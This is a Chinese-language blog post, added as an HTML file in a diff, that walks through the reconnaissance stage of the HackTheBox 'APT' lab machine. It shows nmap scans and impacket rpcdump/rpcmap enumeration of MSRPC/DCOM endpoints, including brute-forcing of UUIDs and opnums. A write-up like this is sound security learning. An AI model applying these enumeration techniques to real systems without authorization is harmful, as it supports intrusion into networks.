@@ -1,0 +1,928 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="从 APT 靶机开始的内网渗透学习前置知识信息收集12345┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 10.10.10.213PORT    STATE SERVICE80&#x2F;tcp  open  http135&#x2F;tcp open  msrpc  只开放了两个端口 123456789101112131415161718192021┌──">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 APT 靶机开始的内网渗透学习">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/4af173e66943.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="从 APT 靶机开始的内网渗透学习前置知识信息收集12345┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 10.10.10.213PORT    STATE SERVICE80&#x2F;tcp  open  http135&#x2F;tcp open  msrpc  只开放了两个端口 123456789101112131415161718192021┌──">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cd5d091bb17c6136654b4ea59908d350_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3f7e83d8b5be9011aeced0c2b78fd1a9_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/659f838877e86fd969183eb6af0201d7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9f0207bc417450b9913e44bc18e1b1c5_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/d4a58635a4327f9be86d57d9bff6d649_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c1caf8017a9364efd2ba6bffff93bb06_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/17b56965079f20161b94e6a6f9830507_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2470964adde62b7e6efc05bab3d6ff66_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/af6b750cefaf042229d58a597e0b7bce_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e5e6041b2153951d9d2cbceb1820b8f7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7cad8e63ac47007e8462329a64810eb1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/de76b114744ac6eec4d11726ee8475b5_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9ac635a3fa50eae4c7de44cb668e8f7e_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4ab933898bfdfec96aa737e1e6ed5fc3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a78891469366b5ec6a3b38d9160074c6_MD5.png">
+<meta property="article:published_time" content="2023-10-29T11:22:20.000Z">
+<meta property="article:modified_time" content="2023-11-02T13:08:23.318Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/cd5d091bb17c6136654b4ea59908d350_MD5.png">
+  
+  
+  
+  <title>从 APT 靶机开始的内网渗透学习 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从 APT 靶机开始的内网渗透学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-29 19:22" pubdate>
+          2023年10月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          40k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          334 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">从 APT 靶机开始的内网渗透学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="从-APT-靶机开始的内网渗透学习"><a href="#从-APT-靶机开始的内网渗透学习" class="headerlink" title="从 APT 靶机开始的内网渗透学习"></a>从 APT 靶机开始的内网渗透学习</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.10.213<br>PORT    STATE SERVICE<br>80/tcp  open  http<br>135/tcp open  msrpc<br></code></pre></td></tr></table></figure>
+
+<p>只开放了两个端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo nmap -sT -sV -sC -O -p80,135 10.10.10.213<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 07:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.213<br>Host is up (0.077s latency).<br><br>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Gigantic Hosting | Home<br>| http-methods:<br>|_  Potentially risky methods: TRACE<br>135/tcp open  msrpc   Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2016 (89%)<br>OS CPE: cpe:/o:microsoft:windows_server_2016<br>Aggressive OS guesses: Microsoft Windows Server 2016 (89%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></td></tr></table></figure>
+
+<p>Windows 操作系统，80 端口暴露了 <code>Microsoft IIS httpd 10.0</code>，135 端口是 msrpc 服务</p>
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>80 端口简单查看后发现，网页中有这样一个注释</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&amp;CO&#x27;2014], Mon, 23 Dec 2019 08:12:54 GMT --&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试搜索了一下，并没有找到合适的利用方式。对于网页中的图片尝试使用 exiftool 和 file 命令进行了查看没有什么暗示。可提交界面中，写入一些数据提交后，显示的是无法连接10.13.38.16，和我们现在针对的 ip 并不相同。</p>
+<p>目录爆破也试了一下，没有发现有价值的目录。</p>
+<h2 id="MSPRC-渗透"><a href="#MSPRC-渗透" class="headerlink" title="MSPRC 渗透"></a>MSPRC 渗透</h2><p>那就只能去查看 135 端口了。我们需要先补充一部分 MSRPC 的知识。也可以去看看这篇博客 <a target="_blank" rel="noopener" href="https://juggernaut-sec.com/ad-recon-msrpc/">AD Recon – MSRPC (135&#x2F;539) - Juggernaut-sec</a> 对于 MSRPC 的渗透过程讲得很细致，在不要求严格逻辑性的情况下，直接使用上述博客中的思路会极大降低这台靶机的难度。</p>
+<blockquote>
+<p><strong>MSRPC</strong> is an interprocess communication (IPC) mechanism that allows client&#x2F;server software communcation. That process can be on the same computer, on the local network (LAN), or across the Internet. Its purpose is to provide a common interface between applications.Within Windows environments, <strong>many server applications are exposed via RPC</strong>.<br><a target="_blank" rel="noopener" href="https://0xffsec.com/handbook/services/msrpc/">MSRPC (Microsoft Remote Procedure Call) Service Enumeration | 0xffsec Handbook</a></p>
+</blockquote>
+<p>MSRPC 所使用的端口有 UDP 135 和 TCP 139 &#x2F; 445 。除此之外还涉及两个概念</p>
+<ul>
+<li><strong>RPC Locator Service</strong>（RPC 定位器服务）：负责提供远程过程调用的定位服务，通过 RPC Locator Service，客户端可以查询网络上的计算机和服务，以确定它们的位置和可用性</li>
+<li><strong>RPC Endpoints</strong>（RPC 终端点）：每个 RPC 终端点标识一个网络上的服务或程序。当客户端应用程序需要调用远程服务器上的服务时，它们会通过 RPC Locator Service 查找目标服务器上的 RPC 终端点。一旦找到匹配的终端点，客户端就可以使用该终端点与目标服务器进行远程过程调用。每个返回的 IFID 值代表一个 RPC 服务</li>
+</ul>
+<p>而我们可以利用工具与其交互从而获得 RPC Endpoints。我们先尝试使用 rpcclient 与其连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo rpcclient -I 10.10.10.213 -P 135<br>Failed to <span class="hljs-built_in">set</span> machine account: NT_STATUS_CANT_ACCESS_DOMAIN_INFO<br></code></pre></td></tr></table></figure>
+
+<p>应当是访问权限的问题，那我们只能使用别的工具来操作了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo nmap -p135 --script=msrpc-enum 10.10.10.213<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 08:11 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.213<br>Host is up (0.081s latency).<br><br>PORT    STATE SERVICE<br>135/tcp open  msrpc<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.94 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>nmap 自带脚本没扫出什么。接下来涉及一个工具集</p>
+<blockquote>
+<p> impacket 是一系列网络协议的 python 实现，实现包括 IP、TCP、ICMP 等基础的网络协议，更重要的是其实现了大量的 Windows 通信协议。其可以在底层进行交互，</p>
+</blockquote>
+<p>我们首先要使用的是其中的 rpcdump.py，在 kali 中可以使用 impacket-rpcdump 来运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//默认端口为135<br>impacket-rpcdump 10.10.10.213<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/cd5d091bb17c6136654b4ea59908d350_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们虽然得到了一些 UUID 相关的一些信息（以及 DOM 组件&#x2F;方法），但是我们并不知道用法，因此需要另一个工具 <code>rpcmap</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ impacket-rpcmap ncacn_ip_tcp:10.10.10.213[135]<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 00000136-0000-0000-C000-000000000046 v0.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 000001A0-0000-0000-C000-000000000046 v0.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0<br></code></pre></td></tr></table></figure>
+
+<p>这里涉及到对 DCOM 的一些理解</p>
+<blockquote>
+<p>COM （Component Object Model，组件对象模型）是微软的一套软件组件的二进制接口标准，由一组构造规范和组件对象库组成。COM 组件对象通过接口来描述自身，组件所提供的所有服务都通过其接口公开。在 Windows 中每个 COM 对象都有唯一的 128 位的二进制标识符标识，即 GUID。当 GUID 用于标识 COM 对象时，被称为 CLSID（类标识符），当它用于标识接口时，被称为 IID（接口标识符），一些 CLSID 还具有 ProgID 方便人们记忆<br>DCOM （Distributed Component Object Model，分布式组件对象模型）是 COM 的拓展，使用 RPC 技术将 COM 的功能拓展到本地计算机之外，因此在远程系统上托管 COM 服务器端的软件（通常在 DLL 或 EXE 中）可以通过 RPC 向客户端公开其方法。部分 DCOM 组件公开的接口中可能包含不安全的方法<br>总结自《内网渗透体系建设》</p>
+</blockquote>
+<p>我们不仅要获取 UUID 还要尝试获取操作数 opnums，操作数可以理解为 DCOM 若干方法的代号</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-comment">//只添加目标而没有使用额外参数运行 impacket-rpcmap 的话，将尝试使用一些常见的UUID和操作号来调用远程过程调用接口，并记录下每个接口的响应情况和支持的操作。</span><br><br>-brute-uuids: Bruteforce UUIDs even <span class="hljs-keyword">if</span> MGMT <span class="hljs-keyword">interface</span> <span class="hljs-keyword">is</span> available<br><br>-brute-opnums: Bruteforce opnums <span class="hljs-keyword">for</span> found UUIDs<br></code></pre></td></tr></table></figure>
+
+<p>尝试使用上述两个参数来运行工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ impacket-rpcmap ncacn_ip_tcp:10.10.10.213[135] -brute-uuids -brute-opnums<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 00000136-0000-0000-C000-000000000046 v0.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 000001A0-0000-0000-C000-000000000046 v0.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2<br>Opnums 0-64: rpc_s_access_denied<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br>Opnum 0: rpc_x_bad_stub_data<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: success<br>Opnums 6-64: nca_s_op_rng_error (opnum not found)<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br>Opnum 0: success<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: success<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnums 5-64: nca_s_op_rng_error (opnum not found)<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0<br>Opnums 0-64: rpc_s_access_denied<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0<br>Opnum 0: rpc_fault_cant_perform<br>Opnum 1: rpc_fault_cant_perform<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: rpc_x_bad_stub_data<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: rpc_fault_cant_perform<br>Opnum 6: rpc_fault_cant_perform<br>Opnum 7: rpc_x_bad_stub_data<br>Opnum 8: rpc_x_bad_stub_data<br>Opnums 9-64: nca_s_op_rng_error (opnum not found)<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0<br>Opnums 0-64: rpc_s_access_denied<br><br>[*] Tested 354 UUID(s)<br></code></pre></td></tr></table></figure>
+
+<p>有两个存在 success 的 UUID，先尝试谷歌搜索 <code>99FCFEC4-5260-101B-BBCB-00AA0021347A</code> ，谷歌搜索结果的第一条就是微软官方文档，在其中找到了具体的服务名称<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">[MS-DCOM]: Standards Assignments | Microsoft Learn</a></p>
+<p><img src="/pic/3f7e83d8b5be9011aeced0c2b78fd1a9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>操作数为 3 和 5 的结果为 success，点击文档中的链接跳到了</p>
+<p><img src="/pic/659f838877e86fd969183eb6af0201d7_MD5.png" srcset="/img/loading.gif" lazyload></p>
